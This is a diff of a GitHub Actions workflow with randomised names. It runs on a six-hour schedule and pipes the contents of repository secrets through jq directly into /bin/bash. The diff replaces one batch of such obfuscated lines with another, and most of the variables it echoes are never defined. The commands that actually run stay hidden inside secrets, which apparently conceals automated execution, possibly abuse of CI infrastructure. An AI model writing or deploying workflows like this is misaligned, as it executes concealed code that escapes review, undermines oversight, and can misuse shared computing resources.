@@ -1,31 +1,24 @@
 name: huangganshi9316
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 3/6 * * *'
-
+    - cron: '3 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huangganshi9316
         env:
-          esmhu5: ${{ secrets.esmhu5 }}
+          tam037: ${{ secrets.tam037 }}
         run: |
-          echo $esmhu5 | jq -r .ivqka200 | /bin/bash
-          echo $pfvp36868 | jq -r .sm408 | /bin/bash
-          echo $y36952 | jq -r .rupcs4418 | /bin/bash
-          echo $j1605 | jq -r .xp9681 | /bin/bash
-          echo $ylibd348 | jq -r .dk2 | /bin/bash
-          echo $ne11 | jq -r .vtw46600 | /bin/bash
-          echo $z29 | jq -r .ur37291 | /bin/bash
-          echo $d9 | jq -r .hthy116 | /bin/bash
-          echo $gcsw8 | jq -r .nb32763 | /bin/bash
-          echo $rj95 | jq -r .snkq5366 | /bin/bash
-          echo $k097 | jq -r .itv54428 | /bin/bash
-          echo $jcot99 | jq -r .ib061 | /bin/bash
-          echo $y6209 | jq -r .w5 | /bin/bash
-          echo $a58 | jq -r .s192 | /bin/bash
+          echo $tam037 | jq -r .qj78 | /bin/bash
+          echo $btagq54573 | jq -r .ui05 | /bin/bash
+          echo $c6 | jq -r .vlrgr1967 | /bin/bash
+          echo $ila1595 | jq -r .bjqqz8 | /bin/bash
+          echo $v524 | jq -r .sjhpx60 | /bin/bash
+          echo $kvur587 | jq -r .t975 | /bin/bash
+          echo $lajco673 | jq -r .h2565 | /bin/bash
+          echo $bonpb1 | jq -r .xf5116 | /bin/bash
 
